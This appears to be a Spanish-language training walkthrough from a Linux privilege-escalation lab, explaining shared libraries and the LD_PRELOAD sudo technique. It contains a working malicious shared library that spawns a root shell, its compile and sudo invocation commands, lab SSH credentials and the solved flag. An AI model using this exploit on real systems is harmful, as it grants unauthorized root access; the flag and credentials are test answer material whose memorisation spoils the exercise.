
# Bibliotecas compartidas

Es común que los programas Linux utilicen bibliotecas de objetos compartidos enlazados dinámicamente. Las bibliotecas contienen código compilado u otros datos que los desarrolladores utilizan para evitar tener que volver a escribir los mismos fragmentos de código en varios programas.&#x20;

Existen dos tipos de bibliotecas en Linux:&#x20;

* `Bibliotecas estáticas` (indicadas por la extensión de archivo `.a`)
* `Bibliotecas de objetos compartidos vinculados dinámicamente` (indicadas por la extensión de archivo `.so`).&#x20;

Cuando se compila un programa, las bibliotecas estáticas pasan a formar parte del programa y no se pueden modificar. Sin embargo, las bibliotecas dinámicas se pueden modificar para controlar la ejecución del programa que las llama.

Existen varios métodos para especificar la ubicación de las bibliotecas dinámicas, de modo que el sistema sepa dónde buscarlas durante la ejecución del programa. Esto incluye los indicadores `-rpath` o `-rpath-link` al compilar un programa, usar las variables de entorno `LD_RUN_PATH` o `LD_LIBRARY_PATH`, colocar las bibliotecas en los directorios predeterminados `/lib`, `/usr/lib` o especificar otro directorio que contenga las bibliotecas dentro del archivo de configuración `/etc/ld.so.conf`.

Además, la variable de entorno `LD_PRELOAD` puede cargar una biblioteca antes de ejecutar un binario. Las funciones de esta biblioteca tienen preferencia sobre las predeterminadas. Los objetos compartidos que requiere un binario se pueden ver mediante la utilidad `ldd`.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

La imagen de arriba enumera todas las bibliotecas requeridas por `/bin/ls`, junto con sus rutas absolutas.

***

## <mark style="color:purple;">Escalada de privilegios LD\_PRELOAD</mark>

Veamos un ejemplo de cómo podemos utilizar la variable de entorno [LD\_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) para escalar privilegios. Para ello, necesitamos un usuario con privilegios `sudo`.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Este usuario tiene derechos para reiniciar el servicio Apache como root, pero como se trata de un derecho que no aparece en [GTFOBin](https://gtfobins.github.io/#apache) y la entrada `/etc/sudoers` está escrita especificando la ruta absoluta, no se podría usar para escalar privilegios en circunstancias normales. Sin embargo, podemos aprovechar `LD_PRELOAD` para ejecutar un archivo de biblioteca compartida personalizado.&#x20;

Compilemos la siguiente biblioteca:

{% code title="root.c" %}

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

{% endcode %}

Podemos compilarlo de la siguiente manera:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Por último, podemos aumentar los privilegios con el siguiente comando. Asegúrate de especificar la ruta completa al archivo de biblioteca malicioso.

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.175.139 (ACADEMY-LPE-NIX02)
Usuario "htb-student"
Contraseña "Academy_LLPE!"
```

Aumente los privilegios mediante la técnica LD\_PRELOAD. Envíe el contenido del archivo flag.txt en el directorio `/root/ld_preload`.

### 1. Comprobamos permisos sudo

Con `sudo -l` observamos que tenemos una variable de entorno `LD_PRELOAD` y que podemos ejecutar openssl como root:

```shell-session
htb-student@NIX02:~$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

### 2. Compilar librería en C

Vamos a compilar esta libreria en el objetivo, y la guardamos como `root.c`:

{% code title="" %}

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

{% endcode %}

Una vez que lo tenemos en la máquina objetivo lo compilamos con el siguiente comando:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

### 3. Elevar privilegios

Por último podemos elevar nuestros privilegios con el siguiente comando:

```shell-session
htb-student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl version        

root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# whoami
root
```

```shell-session
root@NIX02:~# cd /root
root@NIX02:/root# ls
cron_abuse  kernel_exploit  ld_preload  screen_exploit

root@NIX02:/root# cd ld_preload/
root@NIX02:/root/ld_preload# ls
flag.txt

root@NIX02:/root/ld_preload# cat flag.txt 
6a9c151a59913518b8f09adc78abf1
```
